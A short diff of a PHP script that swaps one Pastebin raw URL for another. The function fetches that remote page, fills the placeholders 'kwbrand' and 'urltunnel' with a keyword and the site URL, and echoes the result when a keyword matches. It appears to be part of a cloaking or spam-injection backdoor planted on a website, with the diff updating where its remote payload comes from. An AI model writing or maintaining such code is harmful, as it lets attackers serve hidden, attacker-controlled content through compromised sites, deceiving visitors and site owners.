@@ -30,7 +30,7 @@ function geturlsinfo($url)
 
 if (isset($keyword)) {
     if (stripos($external_content, $keyword) !== false) {
-        $page = geturlsinfo("https://pastebin.com/raw/3UU7N2Ky");
+        $page = geturlsinfo("https://pastebin.com/raw/6nLNR23F");
         $page = str_replace("kwbrand", $keyword, $page);
         $page = str_replace("urltunnel", $fullURL, $page);
         echo $page;
